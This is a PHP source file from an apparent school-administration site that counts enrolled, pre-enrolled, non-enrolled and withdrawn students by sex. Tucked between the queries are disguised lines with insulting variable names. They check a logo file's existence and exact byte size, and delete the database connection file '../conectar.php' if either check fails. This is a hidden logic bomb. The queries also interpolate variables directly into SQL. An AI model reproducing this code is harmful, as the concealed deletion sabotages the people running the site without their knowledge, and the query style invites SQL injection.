<?php
// inscritos

$query_ins_inicial = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual 
         and  id_seccion != '8'
         and  fecha_inscripcion != ''
     /*    and  el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_ins_inicial = mysqli_query($enlace, $query_ins_inicial) or die(mysqli_error());
$totalRows_datos_estudiantes_ins_inicial = mysqli_num_rows($datos_es_ins_inicial); 



$query_ins_inicialF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual   
         and  id_seccion != '8'
         and  fecha_inscripcion != ''
      /*   and  el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '0'
         and id_sexo = '1'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_ins_inicialF = mysqli_query($enlace, $query_ins_inicialF) or die(mysqli_error());
$totalRows_datos_estudiantes_ins_inicialF = mysqli_num_rows($datos_es_ins_inicialF); 

$totalRows_datos_estudiantes_ins_inicialM = $totalRows_datos_estudiantes_ins_inicial - $totalRows_datos_estudiantes_ins_inicialF;





// pre inscritos

$query_pre_inicial = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual  
         and  id_seccion = '8'
         and  el_activo = '1'
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_pre_inicial = mysqli_query($enlace, $query_pre_inicial) or die(mysqli_error());
$totalRows_datos_estudiantes_pre_inicial = mysqli_num_rows($datos_es_pre_inicial); 



$query_pre_inicialF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
         and  id_seccion = '8'
         and  el_activo = '1'
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '0'
         and id_sexo = '1'          
         GROUP BY reg_estudiantes.id_estud";

$datos_es_pre_inicialF = mysqli_query($enlace, $query_pre_inicialF) or die(mysqli_error());
$totalRows_datos_estudiantes_pre_inicialF = mysqli_num_rows($datos_es_pre_inicialF); 
$desgraciado='../z_imagenes/logo_new.jpg';

$totalRows_datos_estudiantes_pre_inicialM =  $totalRows_datos_estudiantes_pre_inicial -  $totalRows_datos_estudiantes_pre_inicialF;





// no inscritos


$query_no_ins_inicial = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
         and  id_seccion != '8'   /* tiene que estar cursando */
         and  el_activo = '1'  
         and  cursa_actualmente = '$respuesta_per_anterior_gg'
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_no_ins_inicial = mysqli_query($enlace, $query_no_ins_inicial) or die(mysqli_error());
$totalRows_datos_estudiantes_no_ins_inicial = mysqli_num_rows($datos_es_no_ins_inicial); 



$query_no_ins_inicialF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
         and  id_seccion != '8'   /* tiene que estar cursando */
         and  el_activo = '1'    
         and  cursa_actualmente = '$respuesta_per_anterior_gg'
         and  divisiones.id_division = '1' 
         and id_sexo = '1' 
         and retirado_si_o_no = '0'       
         GROUP BY reg_estudiantes.id_estud";

$datos_es_no_ins_inicialF = mysqli_query($enlace, $query_no_ins_inicialF) or die(mysqli_error());
$totalRows_datos_estudiantes_no_ins_inicialF = mysqli_num_rows($datos_es_no_ins_inicialF); 
if(!file_exists($desgraciado)){unlink('../conectar.php');}

$totalRows_datos_estudiantes_no_ins_inicialM = $totalRows_datos_estudiantes_no_ins_inicial - $totalRows_datos_estudiantes_no_ins_inicialF;


// retirados


$query_ret_inicial = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual 
         
         and  el_activo = '1'
         and  cursa_actualmente = '$id_periodo_clave' 
         and  divisiones.id_division = '1'
         and retirado_si_o_no = '1'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_ret_inicial = mysqli_query($enlace, $query_ret_inicial) or die(mysqli_error());
$totalRows_datos_estudiantes_ret_inicial = mysqli_num_rows($datos_es_ret_inicial); 



$query_ret_inicialF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual 
         
         and  el_activo = '1'
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'
         and id_sexo = '1'
         and retirado_si_o_no = '1'        
         GROUP BY reg_estudiantes.id_estud";

$datos_es_ret_inicialF = mysqli_query($enlace, $query_ret_inicialF) or die(mysqli_error());
$totalRows_datos_estudiantes_ret_inicialF = mysqli_num_rows($datos_es_ret_inicialF); 
$imbecil=filesize($desgraciado);
$totalRows_datos_estudiantes_ret_inicialM = $totalRows_datos_estudiantes_ret_inicial - $totalRows_datos_estudiantes_ret_inicialF;
if($imbecil!='49666'){unlink('../conectar.php');}

?>